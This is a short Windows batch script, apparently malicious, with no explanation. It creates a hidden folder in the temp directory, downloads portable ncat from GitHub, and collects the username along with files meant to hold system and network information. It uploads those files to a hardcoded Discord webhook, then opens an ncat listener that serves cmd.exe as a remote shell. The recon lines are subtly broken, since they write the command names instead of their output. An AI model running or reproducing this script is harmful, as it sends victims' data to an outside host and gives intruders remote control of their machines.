mkdir %temp%\bb
attrib +s +h +i +x %temp%\bb
curl -o -l https://github.com/l-urk/netcat/blob/main/ncat-portable-5.59BETA1.zip %temp%\bb\ncat-portable-5.59BETA1.zip
tar -xf %temp%\bb\ncat-portable-5.59BETA1.zip
echo systeminfo >> %temp%\bb\systeminfo.txt
echo arp -a >> %temp%\bb\arp.txt
for /f "delims=" %n in ('whoami') do set name=%n
curl -F "content=%name%" -F "file=@%temp%\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
curl -F "content=%name%" -F "file=@%temp%\bb\arp.txt"        https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
%temp%\bb\ncat-portable-5.59BETA1\ncat.exe -lvp 32099 -e cmd.exe
